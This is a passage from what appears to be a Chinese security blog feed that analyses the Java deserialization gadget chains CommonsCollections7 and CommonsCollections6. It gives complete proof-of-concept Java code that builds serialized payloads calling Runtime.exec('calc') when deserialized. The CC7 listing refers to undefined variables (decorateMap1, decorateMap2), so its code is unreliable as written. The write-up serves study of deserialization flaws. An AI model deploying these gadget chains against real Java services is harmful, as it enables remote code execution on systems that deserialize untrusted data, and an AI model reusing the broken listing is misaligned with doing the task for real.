<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span>.get<br></code></pre></td></tr></table></figure>



<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(LazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(LazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="为什么需要创建两个HashMap"><a href="#为什么需要创建两个HashMap" class="headerlink" title="为什么需要创建两个HashMap"></a>为什么需要创建两个HashMap</h3><p>如果两个hashmap相同的话会直接在<code>hashtable.put()</code>的时候认为是一个元素，所以之后就不会在反序列化的时候触发equals代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604202356973.png" alt="image-20240604202356973"></p>
<h3 id="为什么需要创建两个LazyMap"><a href="#为什么需要创建两个LazyMap" class="headerlink" title="为什么需要创建两个LazyMap"></a>为什么需要创建两个LazyMap</h3><p>首先看<code>HashTable.put</code>，这里和<code>reconstitutionPut</code>处的代码类似，都包含了<code>*.key.equals(key))</code>代码。其中<code>key</code>是传入的<code>LazyMap</code>，<code>tab</code>是全局的一个<code>Entry</code>，根据<code>hashcode</code>算出一个<code>index</code>，只有<code>entry</code>中有元素才会进入<code>for</code>循环，从而进一步触发</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604205642784.png" alt="image-20240604205642784"></p>
<p>所以可以看出，必须要两个或以上元素才能进入<code>entry.key.equals(key))</code>方法。类似地，反序列化的触发点<code>reconstitutionPut</code>处也是这样的逻辑，需要保证必须有两个或以上元素</p>
<p>进而可以得出的结论，能走到<code>LazyMap.get</code>方法的只有<code>lazyMap2</code>这一个对象</p>
<h3 id="为什么选择zZ和yy作为key"><a href="#为什么选择zZ和yy作为key" class="headerlink" title="为什么选择zZ和yy作为key"></a>为什么选择zZ和yy作为key</h3><p>if中的第一个条件就是<code>e.hash == hash</code>，意思就是两个key的hash必须相同。那为什么不把两个key设成一样的呢？这样两个key的hash绝对相等的啊。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204417711.png" alt="image-20240604204417711"></p>
<p>但是如果继续往下跟代码的话就会发现在<code>lazymap</code>的get方法中有以下逻辑，map的key不能重复否则就不会执行<code>transform</code>函数执行代码了。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204650378.png" alt="image-20240604204650378"></p>
<h3 id="为什么Hashtable需要-put-两次"><a href="#为什么Hashtable需要-put-两次" class="headerlink" title="为什么Hashtable需要 put 两次"></a>为什么Hashtable需要 put 两次</h3><p>在<code>Hashtable.reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604203934450.png" alt="image-20240604203934450"></p>
<p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code> elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204034934.png" alt="image-20240604204034934"></p>
<h3 id="为什么要移除第二个LazyMap中的元素"><a href="#为什么要移除第二个LazyMap中的元素" class="headerlink" title="为什么要移除第二个LazyMap中的元素"></a>为什么要移除第二个LazyMap中的元素</h3><ul>
<li>为什么最后要<code>remove(&quot;yy&quot;)</code></li>
</ul>
<p>问题在<code>AbstractMap.equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210421463.png" alt="image-20240604210421463"></p>
<ul>
<li>为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</li>
</ul>
<p>在<code>Hashtable.put()</code>方法时也会调用一次<code>entry.key.equals(key)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210702264.png" alt="image-20240604210702264"></p>
<p>因此在<code>hashtable.put(decorateMap2, 2);</code>之后跟到<code>AbstractMap().equals()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604221340356.png" alt="image-20240604221340356"></p>
<p>这里可以看到，传入<code>LazyMap.get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap.get()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604212136853.png" alt="image-20240604212136853"></p>
<p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/240040">ysoserial CommonsCollections7 &amp; C3P0 详细分析</a>)</p>
<p><a href="https://www.anquanke.com/post/id/248169">CC第7链HashTable触发点深入分析</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12427015.html">java反序列化-ysoserial-调试分析总结篇(7)</a></p>
<p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE">JAVA反序列化之CommonCollections7利用链</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/8-CommonsCollections7/CommonsCollections7.md">CommonsCollections7利用链分析</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC6(最好用的CC链)</title>
    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本JAVA 21</p>
</li>
<li><p>commons-collections 3.2.1</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1现在来说的话比较鸡肋。因为在8u71以后<code>AnnotationInvocationHandler.readObject()</code>改变了。</p>
<p>为了解决高版本的利用问题ysoserial给出了解决方案CommonsCollections6，也就是我们平常称的CC6。</p>
<p>其实后面利用链和CC1是一样的,<code>LazyMap.get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>从ysoserial可以看出链首是HashMap，其实HashMap我们挺熟悉。<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
<p>所以现在只需要有一个类的<code>HashCode()</code>调用了<code>get()</code>就可以将这整段链链接起来。</p>
<h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>作者是发现了<code>TiedMapEntry.HashCode().getValue()</code>中调用了<code>get()</code>,那这就可以把前后两段链链接起来。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p>
<p>完整利用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p>
<h3 id="实现攻击链"><a href="#实现攻击链" class="headerlink" title="实现攻击链"></a>实现攻击链</h3><p>后面代码执行的部分和CC1是一样的，复制就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    	<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure>

<p>接下来直接<code>new TiedMapEntry</code>，看<code>TiedMapEntry</code>的构造器，所以map可以直接传入之前的chainedTransformer，key随便传。</p>
<p>然后<code>new HashMap</code>作为入口，放入把tiedMapEntry放进key。为什么把tiedMapEntry放进key而不是放进value中？因为<code>HashMap.readObject</code>是对key进行<code>hash()</code>。同样的value随便传。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p>
<p>但是我们在URLDNS那条链里面就有经验了，<code>HashMap.put</code>就会对key进行<code>hash()</code>，也就是对key调用<code>hashCode()</code>，会直接导致在序列化的时候直接走完这条链。</p>
<p>所以得更改一下，改法很多，思路其实都是一样的，put时放进一个不能让链连接起来的对象或者方法，序列化的时候改回设想的调用链，让链能连接起来。</p>
<p>这里主要写了两种方式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="遇到一个小问题"><a href="#遇到一个小问题" class="headerlink" title="遇到一个小问题"></a>遇到一个小问题</h3><p>发现这时候反序列化不能成功执行</p>
<p>我们可以尝试调试一下，添加一个lnline Watches，可以看到执行的时候<code>map.put(key，value)</code>把<code>key:&quot;aaa&quot;</code>put进去了，导致我们反序列化得时候<code>if(map.containsKey(key) == false)</code>判定失败，因为这时候<code>if(map.containsKey(key)==true)</code>，然后就走不进这个if，导致调用<code>transform()</code>方法失败，最终导致链不能成功执行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p>
<p>解决方法很简单，等put完后，<code>remove()</code>掉就行，随后就可以正常执行反序列化</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



